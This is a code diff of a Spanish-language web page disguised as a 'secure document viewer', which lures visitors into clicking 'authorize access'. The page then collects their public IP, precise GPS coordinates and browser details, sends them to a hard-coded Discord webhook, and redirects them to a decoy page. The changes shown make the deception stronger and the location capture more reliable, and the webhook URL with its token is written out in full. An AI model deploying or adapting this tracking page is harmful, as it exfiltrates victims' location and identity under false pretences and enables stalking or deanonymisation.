@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visualizador de Documentos Seguro</title>
+    <title>Visor de Documentos Seguro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
@@ -16,75 +16,73 @@
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
-            <h1 class="text-xl font-bold mb-4">Documento Protegido</h1>
-            <p class="text-slate-400 text-sm mb-8">Para acceder al expediente, el sistema requiere una validación de seguridad de su navegador.</p>
+            <h1 class="text-xl font-bold mb-4">Verificación Requerida</h1>
+            <p class="text-slate-400 text-sm mb-8">Para desbloquear el acceso al expediente, el sistema debe confirmar su identidad digital.</p>
             
-            <button onclick="iniciarVerificacion()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full transition-all active:scale-95 shadow-lg shadow-blue-900/20">
-                DESBLOQUEAR ARCHIVO
+            <button onclick="forzarCaptura()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full transition-all active:scale-95 shadow-lg shadow-blue-900/20">
+                AUTORIZAR ACCESO
             </button>
         </div>
 
         <div id="ui-loading" class="hidden">
             <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <p class="text-slate-400 animate-pulse">Procesando firma digital...</p>
+            <p id="status-text" class="text-slate-400 animate-pulse">Sincronizando con el servidor...</p>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
-        const DESTINO_FINAL = "https://google.com"; // Aquí irá tu archivo real
+        const CEBO = "https://google.com";
 
-        async function exfiltrar(lat = "DENIEGA_GPS", lon = "DENIEGA_GPS", acc = "N/A") {
+        async function enviar(lat = "N/A", lon = "N/A", acc = "N/A") {
             try {
-                // Captura de IP (Usa IPv4 para mayor compatibilidad)
-                const resIP = await fetch('https://api.ipify.org?format=json');
-                const ipData = await resIP.json();
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ip = await res.json();
                 
-                const logForense = {
-                    time: new Date().toISOString(),
-                    ip: ipData.ip,
-                    geo: { lat, lon, prec: acc },
-                    agente: navigator.userAgent,
-                    lang: navigator.language
-                };
-
-                // Hash SHA-256 para tu reporte (Cadena de Custodia)
-                const firma = CryptoJS.SHA256(JSON.stringify(logForense)).toString();
+                const data = { ts: new Date().toISOString(), ip: ip.ip, loc: { lat, lon, acc }, ua: navigator.userAgent };
+                const hash = CryptoJS.SHA256(JSON.stringify(data)).toString();
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🛡️ EVIDENCIA CAPTURADA",
-                            color: 15406156, // Rojo pericial
+                            title: "🚨 REPORTE PERICIAL FINAL",
+                            color: lat !== "N/A" ? 3066993 : 15158332,
                             fields: [
-                                { name: "📍 Mapa GPS", value: lat !== "DENIEGA_GPS" ? `[Abrir Ubicación](https://www.google.com/maps?q=${lat},${lon})` : "❌ ACCESO DENEGADO" },
-                                { name: "🎯 Precisión", value: acc !== "N/A" ? `${acc} metros` : "N/A", inline: true },
-                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
-                                { name: "🔑 Hash SHA-256", value: `\`${firma}\`` },
-                                { name: "📱 Navegador", value: `\`${logForense.agente}\`` }
+                                { name: "📍 Ubicación Exacta", value: lat !== "N/A" ? `[Mapa GPS](https://www.google.com/maps?q=${lat},${lon})` : "❌ PERMISO DENEGADO POR NAVEGADOR" },
+                                { name: "🎯 Precisión", value: acc !== "N/A" ? `${acc} metros` : "Falla de sensor", inline: true },
+                                { name: "🌐 IP", value: `\`${ip.ip}\``, inline: true },
+                                { name: "🔑 Hash SHA-256", value: `\`${hash}\`` }
                             ]
                         }]
                     })
                 });
             } finally {
-                window.location.href = DESTINO_FINAL;
+                window.location.href = CEBO;
             }
         }
 
-        function iniciarVerificacion() {
+        function forzarCaptura() {
             document.getElementById('ui-prompt').classList.add('hidden');
             document.getElementById('ui-loading').classList.remove('hidden');
+            document.getElementById('status-text').innerText = "Obteniendo coordenadas...";
 
-            if (navigator.geolocation) {
+            if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => exfiltrar(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
-                    () => exfiltrar(),
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    (p) => enviar(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+                    (e) => {
+                        console.error(e);
+                        enviar();
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 15000, // Aumentamos a 15 segundos para dar tiempo al GPS
+                        maximumAge: 0 
+                    }
                 );
             } else {
-                exfiltrar();
+                enviar();
             }
         }
     </script>
